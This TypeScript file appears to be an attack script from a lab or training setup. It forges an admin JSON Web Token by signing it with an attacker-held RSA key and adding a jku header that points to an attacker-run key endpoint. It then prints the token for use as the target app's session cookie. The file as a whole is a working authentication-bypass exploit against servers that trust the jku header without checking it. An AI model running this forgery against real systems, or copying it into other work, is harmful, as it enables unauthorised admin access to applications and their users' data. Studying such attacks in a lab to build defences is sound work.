import * as crypto from 'crypto';
import * as fs from 'fs';
import * as path from 'path';

// Builds a JWT signed with the attacker's own private key, with a jku header
// pointing back at our own key host. If the target server doesn't validate
// that jku points somewhere it should trust, this token verifies cleanly.

const KEYS_DIR = path.join(__dirname, '..', 'keys');
const KID = 'attacker-key-1';
const PORT = process.env.PORT || 3006;
const JKU = `http://localhost:${PORT}/.well-known/jwks.json`;

function toBase64(str: string): string {
  return Buffer.from(str).toString('base64url');
}

function sign(data: string, privateKeyPem: string): string {
  const signer = crypto.createSign('RSA-SHA256');
  signer.update(data);
  signer.end();
  return signer.sign(privateKeyPem).toString('base64url');
}

function getArg(args: string[], name: string, fallback: string): string {
  const idx = args.indexOf(`--${name}`);
  return idx !== -1 && args[idx + 1] ? args[idx + 1] : fallback;
}

function main() {
  const privateKeyPath = path.join(KEYS_DIR, 'private-key.pem');
  if (!fs.existsSync(privateKeyPath)) {
    console.error('No private key found. Run `npm run generate-keys` first.');
    process.exit(1);
  }
  const privateKey = fs.readFileSync(privateKeyPath, 'utf-8');

  // Defaults forge an admin identity matching the target app's admin user
  // (id 2). Override any field: npm run forge -- --role admin --id 2
  const args = process.argv.slice(2);
  const payload = {
    id: Number(getArg(args, 'id', '2')),
    email: getArg(args, 'email', 'admin.adminson@example.com'),
    firstName: getArg(args, 'firstName', 'Admin'),
    lastName: getArg(args, 'lastName', 'Adminson'),
    role: getArg(args, 'role', 'admin')
  };

  const header = { alg: 'RS256', typ: 'JWT', kid: KID, jku: JKU };

  const headerEnc = toBase64(JSON.stringify(header));
  const payloadEnc = toBase64(JSON.stringify(payload));
  const signature = sign(`${headerEnc}.${payloadEnc}`, privateKey);

  const token = `${headerEnc}.${payloadEnc}.${signature}`;

  console.log('Forged token - set this as the value of the "jwt" cookie on the target app:');
  console.log('');
  console.log(token);
  console.log('');
  console.log('Header: ', header);
  console.log('Payload:', payload);
}

main();
